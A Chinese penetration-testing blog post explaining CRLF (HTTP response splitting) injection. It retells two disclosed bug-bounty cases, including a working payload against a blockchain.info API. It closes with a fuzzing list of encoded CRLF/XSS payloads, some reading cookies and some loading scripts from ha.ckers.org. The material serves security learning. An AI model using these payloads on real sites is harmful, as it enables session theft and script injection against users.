# Original
今天看国外案例的时候看到CRLF的案例，突然也想写一篇文章来记录一下。

# First What Is CRLF
```
CRLF是Carriage-Return Line-Feed的缩写，意思是回车换行，就是回车(CR, ASCII 13, \r) 换行(LF, ASCII 10, \n)，CRLF字符（%0d%0a）CRLF也被称为HTML拆分。
```
我们在渗透测试过程中可以寻找我们可控返回包header的请求
比如下面这个请求
```
GET /test/demo.php?url=https://c1h2e1.github.io
xxxxxxxxxxxxxxxxxxxxx
xxxxxxxxxxxxxxxxx
```
response

```
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: deflate
xxxxxxxx
Locations=https://baidu.com
```
向上述这种返回包里面的header可控的请求我们就可以尝试进行CRLF注入。
```
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2047%0d%0a%0d%0a<script>alert(1)</script>
```
`Content-Length：0` 代表header 的结尾，返回包会变成这个样子
```
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: deflate
xxxxxxxx
Locations=https://baidu.com
Content-Length: 0

<script>alert(1)</script>

```
这样我们就会触发我们的js并弹窗
这也就是最简单的一次**crlf注入**
# 案例
我在国外的漏洞库`pentester.land`搜集了2个CRLF案例
案例一
http://blog.shashank.co/2017/11/crlf-injection-in-bockchaininfo.html
```
GET /charts/total-bitcoins?cors=true&format=csv&lang=english HTTP/1.1
Host: api.blockchain.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
HTTP/2.0 200 OK
date: Tue, 31 Oct 2017 15:47:21 GMT
content-type: text/csv; charset=ascii
content-length: 10953
access-control-allow-origin: *
cache-control: public, max-age=60
content-disposition: attachment; filename="total-bitcoins.csv"
content-language: english


"lang"参数出现在了返回包里
现在为了注入CRLF 我们需要url编码一下\r\n "%0D%0A"
据此发送如下请求
https://api2.blockchain.info/charts/total-bitcoins?cors=true&format=csv&lang=en%0ATEST
新的header出现在了返回包里

这里存在CRLF注入漏洞 ，这样可以进行利用CRLF漏洞去执行JavaScript代码，去盗取cookie

最终的Payload

https://api2.blockchain.info/charts/total-bitcoins?cors=true&format=csv&lang=en%0AX-XSS-Protection:0%0AContent-Type:text/html%0AContent-Length:35%0A%0A%3Csvg%20onload%3Dalert%28document.domain%29%3E&__cf_waf_tk__=012853002E6loVIOSyqHfdxrvHJ87MshEnZI

```

案例二

https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62
```
因为详情写的没有请求包和发现过程
但我可以推算一下
他的请求包出现在了返回包中，比如http://test.com/aaaaaa
我们的aaaa会出现在header中，之后我们就可以测试CRLF的攻击了
利用思路和原来一样就不再写了
```
# KEEP FUZZING
我们在实战中可以选用fuzz 的手段进行挖掘和bypass
so我们再一次分享Payload
```
%0d%0a
%0d%0a%0d%0a
r%0d%0aContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContentType:%20text/html%0d%0aContentLength:%2019%0d%0a%0d%0a<html>Injected%02Content</html>
%0d%0d%0a%0a
0x0D0x0A
0x0D0x0D0x0A0x0A
\r\n
%5cr%5cn
%0%0d%0ad%0%0d%0aa
%0%0D%0AD%0%0D%0AA
%0d%0aContentType:%20text/html;charset=UTF-7%0d%0aContent-Length:%20129%0d%0a%0d%0a%2BADw-html%2BAD4-%2BADw-body%2BAD4-%2BADw-script%2BAD4-alert%28%27XSS,cookies:%27%2Bdocument.cookie%29%2BADw-/script%2BAD4-%2BADw-/body%2BAD4-%2BADw-/html%2BAD4
%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3Ehttp://www.test.com
%0d%0a%0d%0a%3Chtml%3E%3Cbody%3E%3C%2Fbody%3E%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fs.js%3E%3C%2Fscript%3E%3Cscript%3Ealert(%22location.host%20is:%20%22%2Blocation.host)%3C%2Fscript%3E%3C%2Fhtml%3E
%0d%0a%0d%0a%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2Fscript%3E
%22%3E%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%3C%22
%0AContent-type:%20text/html%0A%0Ahttp://www.test.com/%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
%0d%0a%0d%0a%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E
%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
```

# 总结
临时想到要写的一篇文章，研究新漏洞总结新思路！！
